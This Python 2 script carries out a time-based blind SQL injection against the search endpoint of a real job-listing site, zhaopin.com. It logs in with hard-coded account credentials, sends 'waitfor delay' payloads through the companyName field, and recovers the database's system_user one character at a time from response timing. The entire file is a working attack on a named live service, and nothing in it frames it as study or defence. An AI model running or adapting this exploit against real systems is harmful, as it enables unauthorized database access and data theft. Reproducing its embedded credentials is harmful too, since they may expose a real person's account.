#encoding: utf-8
import sys
reload(sys)
sys.setdefaultencoding('utf-8')
import requests
import time
import string
import sys
import urllib

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36'}
payloads = list(string.ascii_lowercase)
#payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')

for i in range(0,10):
    payloads.append(str(i))
payloads += ['@','_', '.', '-', '\\', ' ']
print 'Try to retrive user:'
user = ''
session = requests.session()
session.get('http://passport.zhaopin.com/account/loginhandler?callback=jQuery16405709039543289691_1453969327994&LoginName=15557608421&Password=test0214&CheckCode=&RememberMe=true&_=1453969356135')
for i in range(1,11):
    for payload in payloads:
        #r = session.get('http://xiaoyuan.zhaopin.com/Home/Resumes/UserResume').text
        #print r
        start_time = time.time()
        s = "if(ascii(substring(system_user,%s,1))=%s)waitfor delay'0:0:5'--" %(i, ord(payload))
        postData = "CityId=551&schoolName=&companyName=test'" + (s) + "&StartTime=%E9%80%89%E6%8B%A9%E6%97%A5%E6%9C%9F&EndTime=%E9%80%89%E6%8B%A9%E6%97%A5%E6%9C%9F&PageSize=30&PageNumber=1&SelectPage="
        #postData_encode = urllib.urlencode(postData)
        #print postData
        requrl = "http://xiaoyuan.zhaopin.com/FindFullTime/Presentation/SearchResult"
        result = session.post(requrl, data = postData, headers = headers).text
        print payload,
        #print result
        if (time.time() - start_time) > 3:
            user += payload
            print '\n[*]', user

#print result
print '\n[Done] User is:', user